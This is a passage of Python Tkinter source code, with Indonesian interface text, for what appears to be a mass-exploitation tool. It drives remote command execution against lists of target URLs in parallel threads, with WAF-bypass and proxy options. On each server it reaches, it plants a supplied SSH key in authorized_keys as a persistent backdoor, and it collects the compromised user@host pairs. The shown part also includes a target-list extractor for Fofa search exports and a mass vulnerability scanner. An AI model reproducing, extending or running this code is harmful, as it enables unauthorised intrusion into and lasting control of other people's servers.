            messagebox.showerror("Error", "Masukkan SSH public key", parent=self.root)
            return
        
        targets_text = self.ssh_targets_text.get('1.0', tk.END).strip()
        if not targets_text:
            messagebox.showerror("Error", "Masukkan list target", parent=self.root)
            return
        
        try:
            threads = int(self.ssh_threads_var.get())
            if threads < 1:
                raise ValueError("Threads harus lebih besar dari 0")
        except ValueError:
            messagebox.showerror("Error", "Threads tidak valid", parent=self.root)
            return
        
        try:
            timeout = int(self.ssh_timeout_var.get())
            if timeout < 1:
                raise ValueError("Timeout harus lebih besar dari 0")
        except ValueError:
            messagebox.showerror("Error", "Timeout tidak valid", parent=self.root)
            return
        
        targets = self._parse_mine_targets(targets_text)
        if not targets:
            messagebox.showerror("Error", "Tidak ada target yang valid ditemukan", parent=self.root)
            return
        
        self.ssh_running = True
        self.ssh_stop_flag = False
        self.ssh_results = []
        self.ssh_start_btn.config(state=tk.DISABLED)
        self.ssh_stop_btn.config(state=tk.NORMAL)
        # Keep copy button always enabled so user can copy results anytime
        self.ssh_copy_btn.config(state=tk.NORMAL)
        
        self.ssh_log_output.delete('1.0', tk.END)
        self.ssh_log_output.insert('1.0', f"Starting SSH key addition for {len(targets)} targets...\n", "info")
        self.ssh_log_output.insert(tk.END, f"Threads: {threads}, Timeout: {timeout}s\n", "info")
        self.ssh_log_output.insert(tk.END, "=" * 60 + "\n\n")
        
        threading.Thread(target=self._add_ssh_targets, args=(targets, threads, timeout, ssh_key), daemon=True).start()
    
    def _stop_auto_ssh(self):
        """Stop auto adding SSH keys."""
        self.ssh_stop_flag = True
        self.ssh_progress_var.set("Stopping...")
        if self.ssh_executor:
            for future in self.ssh_futures:
                future.cancel()
            self.ssh_executor.shutdown(wait=False)
    
    def _copy_ssh_results(self):
        """Copy successful SSH results to clipboard - can be called anytime, even during process."""
        with self.ssh_results_lock:
            # Create a copy of results to avoid issues during iteration
            current_results = list(self.ssh_results)
            
            if not current_results:
                # No popup - just return silently
                return
            
            # Get selected format
            copy_format = self.ssh_copy_format_var.get()
            
            formatted_lines = []
            for result in current_results:
                username = result.get('username', '')
                host = result.get('host', '')
                port = result.get('port', '22')
                
                if copy_format == "Koneksi SSH":
                    # Format: user@host (atau user@host:port jika port bukan 22)
                    if port and port != "22":
                        formatted_lines.append(f"{username}@{host}:{port}")
                    else:
                        formatted_lines.append(f"{username}@{host}")
                else:
                    # Default format: user | host | port
                    formatted_lines.append(f"{username} | {host} | {port}")
            
            result_text = '\n'.join(formatted_lines)
            
            # Copy to clipboard
            self.root.clipboard_clear()
            self.root.clipboard_append(result_text)
            self.root.update()
            
            # No popup - copy silently
    
    def _add_ssh_targets(self, targets: List[str], threads: int, timeout: int, ssh_key: str):
        """Add SSH keys to multiple targets using threads."""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        total = len(targets)
        completed = 0
        
        try:
            self.ssh_executor = ThreadPoolExecutor(max_workers=threads)
            self.ssh_futures = []
            
            for target_url in targets:
                if self.ssh_stop_flag:
                    break
                future = self.ssh_executor.submit(self._add_ssh_single_target, target_url, timeout, ssh_key)
                self.ssh_futures.append(future)
            
            for future in as_completed(self.ssh_futures):
                if self.ssh_stop_flag:
                    break
                completed += 1
                self.root.after(0, lambda c=completed, t=total: 
                              self.ssh_progress_var.set(f"Progress: {c}/{t}"))
            
        except Exception as e:
            self.root.after(0, lambda msg=str(e): 
                          self.ssh_log_output.insert(tk.END, f"ERROR: {msg}\n", "error"))
        finally:
            self.ssh_running = False
            self.ssh_stop_flag = False
            self.root.after(0, lambda: self.ssh_start_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.ssh_stop_btn.config(state=tk.DISABLED))
            self.root.after(0, lambda: self.ssh_copy_btn.config(state=tk.NORMAL))  # Keep enabled
            self.root.after(0, lambda: self.ssh_progress_var.set("Ready"))
            if self.ssh_executor:
                self.ssh_executor.shutdown(wait=True)
    
    def _add_ssh_single_target(self, target_url: str, timeout: int, ssh_key: str):
        """Add SSH key to a single target using RCE."""
        try:
            # Create exploit instance
            ssh_exploit = CVEExploit(timeout=timeout, verify_ssl=False)
            ssh_exploit.update_proxy(
                self.proxy_check_var.get(),
                self.proxy_entry.get()
            )
            
            # Disable retries
            for prefix in ('http://', 'https://'):
                if prefix in ssh_exploit.session.adapters:
                    adapter = ssh_exploit.session.adapters[prefix]
                    from urllib3.util.retry import Retry
                    adapter.max_retries = Retry(total=0, connect=0, read=0, redirect=0, status=0, other=0, backoff_factor=0)
            
            endpoint = self.endpoint_entry.get()
            unicode_waf = self.unicode_waf_var.get()
            utf16_waf = self.utf16_waf_var.get()
            aes = self.aes_var.get()
            payload_type = self.payload_type_var.get()
            
            # Step 1: Check container - pwd contains /app
            try:
                pwd_check = ssh_exploit.execute_command_auto(
                    target_url, endpoint, "pwd",
                    unicode_waf, utf16_waf, aes, False, payload_type
                )
                
                if pwd_check and "/app" in pwd_check:
                    self.root.after(0, lambda t=target_url, p=pwd_check.strip(): 
                                  self.ssh_log_output.insert(tk.END, f"[SKIP] {t}: Server di dalam container (pwd: {p})\n", "info"))
                    return
            except Exception as e:
                # Continue if pwd check fails
                pass
            
            # Step 2: Check container - alternative method
            try:
                container_check = ssh_exploit.execute_command_auto(
                    target_url, endpoint,
                    "test -f /.dockerenv && echo container || echo host",
                    unicode_waf, utf16_waf, aes, False, payload_type
                )
                
                if container_check and "container" in container_check.lower():
                    self.root.after(0, lambda t=target_url: 
                                  self.ssh_log_output.insert(tk.END, f"[SKIP] {t}: Server di dalam container\n", "info"))
                    return
            except Exception as e:
                # Continue if container check fails
                pass
            
            # Step 3: Get username using RCE
            try:
                whoami_result = ssh_exploit.execute_command_auto(
                    target_url, endpoint, "whoami",
                    unicode_waf, utf16_waf, aes, False, payload_type
                )
            except Exception as e:
                self.root.after(0, lambda t=target_url, msg=str(e): 
                              self.ssh_log_output.insert(tk.END, f"[ERROR] {t}: Gagal execute whoami - {msg}\n", "error"))
                return
            
            if not whoami_result or not whoami_result.strip():
                self.root.after(0, lambda t=target_url: 
                              self.ssh_log_output.insert(tk.END, f"[ERROR] {t}: Tidak bisa mendapatkan username (hasil kosong)\n", "error"))
                return
            
            username = whoami_result.strip()
            is_root = (username == "root")
            
            # Step 4: Determine SSH directory and home directory
            if is_root:
                home_dir = "/root"
                ssh_dir = "/root/.ssh"
            else:
                try:
                    home_result = ssh_exploit.execute_command_auto(
                        target_url, endpoint,
                        f"getent passwd {username} | cut -d: -f6",
                        unicode_waf, utf16_waf, aes, False, payload_type
                    )
                    
                    if home_result and home_result.strip():
                        home_dir = home_result.strip()
                        ssh_dir = f"{home_dir}/.ssh"
                    else:
                        home_dir = f"/home/{username}"
                        ssh_dir = f"{home_dir}/.ssh"
                except Exception as e:
                    # Fallback to default
                    home_dir = f"/home/{username}"
                    ssh_dir = f"{home_dir}/.ssh"
            
            # Step 5: Create .ssh directory if not exists
            try:
                # Check if .ssh exists, if not create it
                check_ssh_cmd = f"test -d {ssh_dir} && echo 'exists' || echo 'not_exists'"
                check_result = ssh_exploit.execute_command_auto(
                    target_url, endpoint, check_ssh_cmd,
                    unicode_waf, utf16_waf, aes, False, payload_type
                )
                
                if not check_result or "not_exists" in check_result:
                    # Create .ssh directory
                    create_dir_cmd = f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir}"
                    create_dir_result = ssh_exploit.execute_command_auto(
                        target_url, endpoint, create_dir_cmd,
                        unicode_waf, utf16_waf, aes, False, payload_type
                    )
            except Exception as e:
                self.root.after(0, lambda t=target_url, msg=str(e): 
                              self.ssh_log_output.insert(tk.END, f"[ERROR] {t}: Gagal create .ssh directory - {msg}\n", "error"))
                return
            
            # Step 6: Check if key already exists in authorized_keys
            try:
                # Get key fingerprint (first two parts: type and key content)
                ssh_key_parts = ssh_key.strip().split()
                if len(ssh_key_parts) < 2:
                    self.root.after(0, lambda t=target_url: 
                                  self.ssh_log_output.insert(tk.END, f"[ERROR] {t}: Format SSH key tidak valid\n", "error"))
                    return
                
                key_fingerprint = f"{ssh_key_parts[0]} {ssh_key_parts[1]}"
                
                # Check if authorized_keys exists and read it
                check_auth_cmd = f"test -f {ssh_dir}/authorized_keys && cat {ssh_dir}/authorized_keys || echo ''"
                existing_keys = ssh_exploit.execute_command_auto(
                    target_url, endpoint, check_auth_cmd,
                    unicode_waf, utf16_waf, aes, False, payload_type
                )
                
                if existing_keys and existing_keys.strip():
                    # Check each line in authorized_keys
                    existing_lines = existing_keys.strip().split('\n')
                    for line in existing_lines:
                        if line.strip():
                            # Split by space and get first two parts (type and key)
                            line_parts = line.strip().split()
                            if len(line_parts) >= 2:
                                line_fingerprint = f"{line_parts[0]} {line_parts[1]}"
                                # Compare fingerprints
                                if line_fingerprint == key_fingerprint:
                                    # Key already exists, skip
                                    from urllib.parse import urlparse
                                    parsed = urlparse(target_url)
                                    host = parsed.hostname or target_url
                                    port = parsed.port or 22
                                    
                                    self.root.after(0, lambda t=target_url, h=host, p=str(port), u=username: 
                                                  self.ssh_log_output.insert(tk.END, f"[SKIP] {t} -> {h}:{p} {u} (Key sudah ada)\n", "exists"))
                                    return
            except Exception as e:
                # If check fails, continue anyway (might be first time)
                pass
            
            # Step 7: Add SSH key using RCE
            # Escape the key properly for shell command
            escaped_key = ssh_key.replace("'", "'\"'\"'").replace("$", "\\$").replace("`", "\\`")
            
            # Get key fingerprint for verification (reuse from Step 6)
            key_fingerprint = f"{ssh_key_parts[0]} {ssh_key_parts[1]}"
            
            # Try to add key (even if command fails, we'll verify)
            add_success = False
            try:
                # Use printf for better handling of special characters
                # Create authorized_keys if not exists, then append key
                add_key_cmd = f"printf '%s\\n' '{escaped_key}' >> {ssh_dir}/authorized_keys && chmod 600 {ssh_dir}/authorized_keys"
                
                # Set ownership if not root
                if not is_root:
                    add_key_cmd += f" && chown {username}:{username} {ssh_dir}/authorized_keys 2>/dev/null || true"
                else:
                    add_key_cmd += " || true"
                
                add_key_result = ssh_exploit.execute_command_auto(
                    target_url, endpoint, add_key_cmd,
                    unicode_waf, utf16_waf, aes, False, payload_type
                )
                add_success = True
            except Exception as e:
                # Command might have failed, but key might still be added
                # We'll verify in next step - this is CRITICAL
                add_success = False
            
            # Step 8: Verify key was actually added (CRITICAL - even if command failed)
            # This is the most important step - verify by reading authorized_keys
            key_verified = False
            try:
                # Wait a bit for file system to sync
                import time
                time.sleep(0.5)
                
                # Read authorized_keys and check if our key is there
                verify_cmd = f"cat {ssh_dir}/authorized_keys 2>/dev/null || echo ''"
                verify_result = ssh_exploit.execute_command_auto(
                    target_url, endpoint, verify_cmd,
                    unicode_waf, utf16_waf, aes, False, payload_type
                )
                
                if verify_result and verify_result.strip():
                    # Check each line for our key fingerprint
                    verify_lines = verify_result.strip().split('\n')
                    for line in verify_lines:
                        if line.strip():
                            line_parts = line.strip().split()
                            if len(line_parts) >= 2:
                                line_fingerprint = f"{line_parts[0]} {line_parts[1]}"
                                if line_fingerprint == key_fingerprint:
                                    key_verified = True
                                    break
            except Exception as e:
                # Verification failed, but we'll still try to proceed
                pass
            
            # If key is verified, consider it success regardless of command result
            if not key_verified:
                # Key not found, it really failed
                if not add_success:
                    self.root.after(0, lambda t=target_url: 
                                  self.ssh_log_output.insert(tk.END, f"[ERROR] {t}: Gagal add SSH key dan verifikasi gagal\n", "error"))
                    return
                else:
                    # Command seemed to succeed but key not found - might be permission issue
                    self.root.after(0, lambda t=target_url: 
                                  self.ssh_log_output.insert(tk.END, f"[ERROR] {t}: Key tidak ditemukan setelah add (mungkin permission issue)\n", "error"))
                    return
            
            # Step 8: Get hostname and port from URL
            from urllib.parse import urlparse
            parsed = urlparse(target_url)
            host = parsed.hostname or target_url
            port = parsed.port or 22
            
            # Step 9: Store successful result (only if key is verified)
            # Key is verified, so it's a success regardless of command result
            with self.ssh_results_lock:
                self.ssh_results.append({
                    "host": host,
                    "port": str(port),
                    "username": username
                })
            
            # Step 10: Log success
            # If command failed but key verified, mention it
            if not add_success:
                self.root.after(0, lambda h=host, p=str(port), u=username, t=target_url: 
                              self.ssh_log_output.insert(tk.END, f"[SUCCESS] {t} -> {h}:{p} {u} (Key verified meskipun command error)\n", "success"))
            else:
                self.root.after(0, lambda h=host, p=str(port), u=username, t=target_url: 
                              self.ssh_log_output.insert(tk.END, f"[SUCCESS] {t} -> {h}:{p} {u}\n", "success"))
            self.root.after(0, lambda: self.ssh_log_output.see(tk.END))
            
        except Exception as e:
            error_msg = str(e)
            self.root.after(0, lambda t=target_url, msg=error_msg: 
                          self.ssh_log_output.insert(tk.END, f"[ERROR] {t}: {msg}\n", "error"))
            self.root.after(0, lambda: self.ssh_log_output.see(tk.END))
    
    def _create_url_extractor_tab(self, parent):
        """Create Url Extractor tab."""
        # Instructions
        info_frame = ttk.LabelFrame(parent, text="Instruksi", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        
        info_text = "Extract URL dari berbagai format file. Support: txt, pdf, docx, excel, csv, dan file code."
        ttk.Label(info_frame, text=info_text, font=('TkDefaultFont', 9), 
                 foreground='gray', wraplength=600).pack(anchor=tk.W)
        
        # Configuration frame
        config_frame = ttk.LabelFrame(parent, text="Konfigurasi", padding=5)
        config_frame.pack(fill=tk.X, pady=5)
        
        # Format selection
        format_frame = ttk.Frame(config_frame)
        format_frame.pack(fill=tk.X, pady=2)
        ttk.Label(format_frame, text="Format List:").pack(side=tk.LEFT, padx=5)
        self.extractor_format_var = tk.StringVar(value="Default")
        format_combo = ttk.Combobox(format_frame, textvariable=self.extractor_format_var, 
                                    values=["Default", "Fofa CSV"], state="readonly", width=20)
        format_combo.pack(side=tk.LEFT, padx=5)
        
        # File input button
        file_btn_frame = ttk.Frame(config_frame)
        file_btn_frame.pack(fill=tk.X, pady=2)
        ttk.Label(file_btn_frame, text="Input:").pack(side=tk.LEFT, padx=5)
        get_file_btn = ttk.Button(file_btn_frame, text="Get from File", 
                                  command=self._get_file_for_extractor)
        get_file_btn.pack(side=tk.LEFT, padx=5)
        
        # Input list area
        input_frame = ttk.LabelFrame(parent, text="Input List", padding=5)
        input_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.extractor_input_text = scrolledtext.ScrolledText(input_frame, height=10, wrap=tk.WORD,
                                                             font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9))
        self.extractor_input_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # Buttons
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill=tk.X, pady=5)
        process_btn = ttk.Button(btn_frame, text="Process", 
                                command=self._process_url_extraction)
        process_btn.pack(side=tk.LEFT, padx=5)
        
        copy_all_btn = ttk.Button(btn_frame, text="Copy All", 
                                 command=self._copy_extracted_urls)
        copy_all_btn.pack(side=tk.LEFT, padx=5)
        
        # Info label next to Copy All button
        self.extractor_info_var = tk.StringVar(value="")
        info_label = ttk.Label(btn_frame, textvariable=self.extractor_info_var, 
                              font=('TkDefaultFont', 9), foreground='gray')
        info_label.pack(side=tk.LEFT, padx=10)
        
        # Output area
        output_frame = ttk.LabelFrame(parent, text="Output", padding=5)
        output_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.extractor_output_text = scrolledtext.ScrolledText(output_frame, height=10, wrap=tk.WORD,
                                                               font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9))
        self.extractor_output_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # Store extracted URLs
        self.extracted_urls = []
    
    def _get_file_for_extractor(self):
        """Get file content and populate input area."""
        filetypes = [
            ("All supported", "*.txt;*.pdf;*.docx;*.xlsx;*.xls;*.csv;*.py;*.js;*.java;*.cpp;*.c;*.php;*.rb;*.go;*.rs;*.ts;*.html;*.xml;*.json"),
            ("Text files", "*.txt"),
            ("PDF files", "*.pdf"),
            ("Word documents", "*.docx"),
            ("Excel files", "*.xlsx;*.xls"),
            ("CSV files", "*.csv"),
            ("Code files", "*.py;*.js;*.java;*.cpp;*.c;*.php;*.rb;*.go;*.rs;*.ts;*.html;*.xml;*.json"),
            ("All files", "*.*")
        ]
        
        filename = filedialog.askopenfilename(
            title="Pilih file untuk extract URL",
            filetypes=filetypes
        )
        
        if not filename:
            return
        
        try:
            content = self._read_file_content(filename)
            if content:
                self.extractor_input_text.delete('1.0', tk.END)
                self.extractor_input_text.insert('1.0', content)
                messagebox.showinfo("Success", f"File loaded: {os.path.basename(filename)}", parent=self.root)
        except Exception as e:
            messagebox.showerror("Error", f"Gagal membaca file:\n{str(e)}", parent=self.root)
    
    def _read_file_content(self, filename: str) -> str:
        """Read content from various file formats."""
        ext = os.path.splitext(filename)[1].lower()
        
        if ext == '.txt':
            # Read text file as-is, preserve original format
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                # Preserve line endings
                return content
        
        elif ext == '.csv':
            # For CSV, read as text to preserve format
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        
        elif ext in ['.xlsx', '.xls']:
            try:
                import openpyxl
                wb = openpyxl.load_workbook(filename, data_only=True)
                content = []
                for sheet in wb.worksheets:
                    for row in sheet.iter_rows(values_only=True):
                        if any(cell for cell in row if cell):
                            content.append(','.join(str(cell) if cell else '' for cell in row))
                return '\n'.join(content)
            except ImportError:
                messagebox.showerror("Error", "openpyxl library required for Excel files.\nInstall: pip install openpyxl", parent=self.root)
                return ""
            except Exception as e:
                messagebox.showerror("Error", f"Gagal membaca Excel file:\n{str(e)}", parent=self.root)
                return ""
        
        elif ext == '.pdf':
            try:
                import PyPDF2
                content = []
                with open(filename, 'rb') as f:
                    pdf_reader = PyPDF2.PdfReader(f)
                    for page in pdf_reader.pages:
                        content.append(page.extract_text())
                return '\n'.join(content)
            except ImportError:
                messagebox.showerror("Error", "PyPDF2 library required for PDF files.\nInstall: pip install PyPDF2", parent=self.root)
                return ""
            except Exception as e:
                messagebox.showerror("Error", f"Gagal membaca PDF file:\n{str(e)}", parent=self.root)
                return ""
        
        elif ext == '.docx':
            try:
                from docx import Document
                doc = Document(filename)
                content = []
                for para in doc.paragraphs:
                    if para.text.strip():
                        content.append(para.text)
                return '\n'.join(content)
            except ImportError:
                messagebox.showerror("Error", "python-docx library required for Word files.\nInstall: pip install python-docx", parent=self.root)
                return ""
            except Exception as e:
                messagebox.showerror("Error", f"Gagal membaca Word file:\n{str(e)}", parent=self.root)
                return ""
        
        else:
            # Code files and other text-based files - read as-is
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
    
    def _process_url_extraction(self):
        """Process URL extraction based on selected format."""
        input_content = self.extractor_input_text.get('1.0', tk.END).strip()
        if not input_content:
            messagebox.showerror("Error", "Input list kosong", parent=self.root)
            return
        
        format_type = self.extractor_format_var.get()
        self.extracted_urls = []
        
        try:
            if format_type == "Fofa CSV":
                # Extract from Fofa CSV format: host,ip,port,protocol,domain,link
                # Process like Excel: Text to Column with comma delimiter, then take LINK column
                lines = input_content.split('\n')
                
                for line in lines:
                    line = line.strip()
                    if not line:
                        continue
                    
                    # Skip header row (host,ip,port,protocol,domain,link)
                    if line.lower().startswith('host,ip,port,protocol,domain,link') or \
                       (line.lower().startswith('host,') and 'link' in line.lower()):
                        continue
                    
                    # Split by comma (Text to Column with comma delimiter)
                    # Handle CSV properly - split by comma
                    parts = line.split(',')
                    parts = [p.strip() for p in parts]
                    
                    # Fofa CSV format: host,ip,port,protocol,domain,link
                    # Column order: 0=host, 1=ip, 2=port, 3=protocol, 4=domain, 5=link
                    # We want ONLY column 5 (LINK column)
                    if len(parts) >= 6:
                        # Get LINK column (index 5)
                        link = parts[5].strip()
                        
                        # Clean the link (remove quotes if any)
                        link = link.strip('"').strip("'").strip()
                        
                        # Only add if it's a valid URL
                        if link and (link.startswith('http://') or link.startswith('https://')):
                            self.extracted_urls.append(link)
                    elif len(parts) == 6:
                        # Sometimes there might be trailing comma, handle it
                        link = parts[5].strip().strip('"').strip("'").strip()
                        if link and (link.startswith('http://') or link.startswith('https://')):
                            self.extracted_urls.append(link)
            else:
                # Default format: extract URLs from text and normalize to host:port format
                import re
                import urllib.parse
                
                # Pattern to match full URLs with protocol
                url_pattern = re.compile(r'https?://[^\s<>"\'\[\](){}]+', re.IGNORECASE)
                urls = url_pattern.findall(input_content)
                
                # Normalize URLs: extract only host and port
                normalized_urls = []
                for url in urls:
                    try:
                        parsed = urllib.parse.urlparse(url)
                        if parsed.hostname:
                            # Build normalized URL: protocol://host:port (or just protocol://host if no port)
                            if parsed.port:
                                # Custom port
                                normalized = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
                            else:
                                # Default port (80 for http, 443 for https)
                                normalized = f"{parsed.scheme}://{parsed.hostname}"
                            normalized_urls.append(normalized)
                    except Exception:
                        # If parsing fails, skip this URL
                        continue
                
                # Remove duplicates while preserving order
                seen = set()
                unique_urls = []
                for url in normalized_urls:
                    if url not in seen:
                        seen.add(url)
                        unique_urls.append(url)
                
                self.extracted_urls = unique_urls
            
            # Remove duplicates while preserving order
            seen = set()
            unique_urls = []
            for url in self.extracted_urls:
                if url not in seen:
                    seen.add(url)
                    unique_urls.append(url)
            
            self.extracted_urls = unique_urls
            
            # Display results
            self.extractor_output_text.delete('1.0', tk.END)
            if self.extracted_urls:
                output_text = '\n'.join(self.extracted_urls)
                self.extractor_output_text.insert('1.0', output_text)
                
                # Update info label next to Copy All button
                self.extractor_info_var.set(f"Total row ditemukan: {len(self.extracted_urls)}")
                
                messagebox.showinfo("Success", f"Extracted {len(self.extracted_urls)} unique URLs", parent=self.root)
            else:
                self.extractor_output_text.insert('1.0', "No URLs found")
                
                # Update info label
                self.extractor_info_var.set("Total row ditemukan: 0")
                
                messagebox.showwarning("Warning", "Tidak ada URL yang ditemukan", parent=self.root)
        
        except Exception as e:
            messagebox.showerror("Error", f"Gagal extract URL:\n{str(e)}", parent=self.root)
    
    def _copy_extracted_urls(self):
        """Copy all extracted URLs to clipboard."""
        if not self.extracted_urls:
            # No popup - just return silently
            return
        
        urls_text = '\n'.join(self.extracted_urls)
        self.root.clipboard_clear()
        self.root.clipboard_append(urls_text)
        self.root.update()
        
        # No popup - copy silently
    
    def _create_mass_scan_tab(self, parent):
        """Create Mass Scan tab."""
        # Instructions - more compact
        info_frame = ttk.LabelFrame(parent, text="Instruksi", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        
        info_text = "Masukkan list target (satu per baris). Format: https://domain.com atau http://IP:port. Path otomatis dihapus."
        ttk.Label(info_frame, text=info_text, justify=tk.LEFT, font=('TkDefaultFont', 8)).pack(anchor=tk.W)
        
        # Input area - more compact
        input_frame = ttk.LabelFrame(parent, text="List Target", padding=5)
        input_frame.pack(fill=tk.BOTH, expand=True, pady=2)
        
        self.scan_targets_text = scrolledtext.ScrolledText(
            input_frame,
            height=6,  # Reduced height
            wrap=tk.WORD,
            font=('Consolas', 8) if sys.platform == 'win32' else ('Monospace', 8)  # Smaller font
        )
        # Bind paste event to auto-format
        self.scan_targets_text.bind('<Control-v>', self._handle_paste_urls)
        self.scan_targets_text.bind('<Button-2>', self._handle_paste_urls)  # Middle mouse button
        self.scan_targets_text.pack(fill=tk.BOTH, expand=True)
        
        # Scan options - more compact
        scan_options_frame = ttk.Frame(parent)
        scan_options_frame.pack(fill=tk.X, pady=2)
        
        # First row - compact layout
        options_row1 = ttk.Frame(scan_options_frame)
        options_row1.pack(fill=tk.X, pady=1)
        
        ttk.Label(options_row1, text="Command:", font=('TkDefaultFont', 8)).pack(side=tk.LEFT, padx=2)
        self.scan_test_cmd_var = tk.StringVar(value="id")
        test_cmd_combo = ttk.Combobox(options_row1, textvariable=self.scan_test_cmd_var,
                                      values=["id", "whoami", "echo test"], width=12, state="readonly")
        test_cmd_combo.pack(side=tk.LEFT, padx=2)
        
        # Timeout for scan
        ttk.Label(options_row1, text="Timeout:", font=('TkDefaultFont', 8)).pack(side=tk.LEFT, padx=(5, 2))
        self.scan_timeout_var = tk.StringVar(value="10")  # Default 10 seconds
        scan_timeout_entry = ttk.Entry(options_row1, textvariable=self.scan_timeout_var, width=5)
        scan_timeout_entry.pack(side=tk.LEFT, padx=2)
        ttk.Label(options_row1, text="s", font=('TkDefaultFont', 8), foreground='gray').pack(side=tk.LEFT)
        
        scan_btn = ttk.Button(options_row1, text="Mulai Scan", command=self._start_mass_scan)
        scan_btn.pack(side=tk.LEFT, padx=5)
        self.scan_start_btn = scan_btn
        
        # Stop button
        self.scan_stop_btn = ttk.Button(options_row1, text="⏹️ Stop", 
                                        command=self._stop_mass_scan, state=tk.DISABLED)
        self.scan_stop_btn.pack(side=tk.LEFT, padx=2)
        
        # Progress - compact
        self.scan_progress_var = tk.StringVar(value="Siap")
        progress_label = ttk.Label(options_row1, textvariable=self.scan_progress_var, font=('TkDefaultFont', 8))
        progress_label.pack(side=tk.LEFT, padx=5)
        
        # Current scanning URL display - compact
        self.scan_current_url_var = tk.StringVar(value="")
        current_url_frame = ttk.Frame(options_row1)
        current_url_frame.pack(side=tk.LEFT, padx=(5, 0))
        ttk.Label(current_url_frame, text="Scan:", font=('TkDefaultFont', 8, 'bold')).pack(side=tk.LEFT, padx=(0, 2))
        current_url_label = ttk.Label(current_url_frame, textvariable=self.scan_current_url_var, 
                                      foreground="blue", font=('TkDefaultFont', 8))
        current_url_label.pack(side=tk.LEFT)
        
        # Multiple Commands option
        self.scan_multiple_cmds_var = tk.BooleanVar(value=False)
        multiple_cmds_check = ttk.Checkbutton(options_row1, text="Multi Cmd", 
                                            variable=self.scan_multiple_cmds_var,
                                            command=self._toggle_multiple_commands)
        multiple_cmds_check.pack(side=tk.LEFT, padx=(10, 2))
        
        # Multiple commands input (hidden by default) - compact
        self.scan_multiple_cmds_text = scrolledtext.ScrolledText(
            scan_options_frame,
            height=2,  # Reduced height
            wrap=tk.WORD,
            font=('Consolas', 8) if sys.platform == 'win32' else ('Monospace', 8),  # Smaller font
            state=tk.DISABLED
        )
        self.scan_multiple_cmds_text.insert('1.0', "id\nwhoami\nuname -a")
        self.scan_multiple_cmds_text.pack(fill=tk.X, pady=1)
        self.scan_multiple_cmds_text.pack_forget()  # Hide initially
        
        # Second row - Multi-threading options - compact
        options_row2 = ttk.Frame(scan_options_frame)
        options_row2.pack(fill=tk.X, pady=1)
        
        self.scan_multithread_var = tk.BooleanVar(value=False)
        multithread_check = ttk.Checkbutton(options_row2, text="Multi-Thread", variable=self.scan_multithread_var,
                                           command=self._toggle_multithread)
        multithread_check.pack(side=tk.LEFT, padx=2)
        
        ttk.Label(options_row2, text="Threads:", font=('TkDefaultFont', 8)).pack(side=tk.LEFT, padx=(5, 2))
        self.scan_threads_var = tk.StringVar(value="3")
        threads_entry = ttk.Entry(options_row2, textvariable=self.scan_threads_var, width=4, state=tk.DISABLED)
        threads_entry.pack(side=tk.LEFT, padx=1)
        self.scan_threads_entry = threads_entry
        
        ttk.Label(options_row2, text="(Max:5)", font=('TkDefaultFont', 7), foreground='gray').pack(side=tk.LEFT, padx=1)
        
        ttk.Label(options_row2, text="Batch:", font=('TkDefaultFont', 8)).pack(side=tk.LEFT, padx=(8, 2))
        self.scan_batch_size_var = tk.StringVar(value="10")
        batch_size_entry = ttk.Entry(options_row2, textvariable=self.scan_batch_size_var, width=4, state=tk.DISABLED)
        batch_size_entry.pack(side=tk.LEFT, padx=1)
        self.scan_batch_size_entry = batch_size_entry
        
        # Output areas - split into two panels
        output_container = ttk.Frame(parent)
        output_container.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Left panel - Vulnerable
        vuln_frame = ttk.LabelFrame(output_container, text="✅ Vulnerable Targets", padding=10)
        vuln_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        vuln_header = ttk.Frame(vuln_frame)
        vuln_header.pack(fill=tk.X, pady=(0, 5))
        self.vuln_count_label = ttk.Label(vuln_header, text="Total: 0", font=('TkDefaultFont', 9, 'bold'), foreground="green")
        self.vuln_count_label.pack(side=tk.LEFT)
        
        self.scan_vuln_output = scrolledtext.ScrolledText(
            vuln_frame,
            wrap=tk.WORD,
            font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9),
            height=15,
            bg='#f0f8f0',
            fg='#2d5016'
        )
        self.scan_vuln_output.tag_config("vulnerable", foreground="green", font=('Consolas', 9, 'bold'))
        self.scan_vuln_output.tag_config("header", foreground="darkgreen", font=('Consolas', 9, 'bold'))
        self.scan_vuln_output.pack(fill=tk.BOTH, expand=True)
        
        # Right panel - Not Vulnerable & Errors
        not_vuln_frame = ttk.LabelFrame(output_container, text="❌ Not Vulnerable / Errors", padding=10)
        not_vuln_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        not_vuln_header = ttk.Frame(not_vuln_frame)
        not_vuln_header.pack(fill=tk.X, pady=(0, 5))
        self.not_vuln_count_label = ttk.Label(not_vuln_header, text="Total: 0", font=('TkDefaultFont', 9, 'bold'), foreground="red")
        self.not_vuln_count_label.pack(side=tk.LEFT)
        
        self.scan_not_vuln_output = scrolledtext.ScrolledText(
            not_vuln_frame,
            wrap=tk.WORD,
            font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9),
            height=15,
            bg='#fff8f0',
            fg='#5c3d1a'
        )
        self.scan_not_vuln_output.tag_config("not_vulnerable", foreground="red", font=('Consolas', 9, 'bold'))
        self.scan_not_vuln_output.tag_config("error", foreground="orange", font=('Consolas', 9, 'bold'))
        self.scan_not_vuln_output.tag_config("response", foreground="#888888")
        self.scan_not_vuln_output.pack(fill=tk.BOTH, expand=True)
        
        # Action buttons frame (below output panels)
        action_frame = ttk.Frame(parent)
        action_frame.pack(fill=tk.X, pady=(5, 0))
        
        def clear_vuln():
            self.scan_vuln_output.delete('1.0', tk.END)
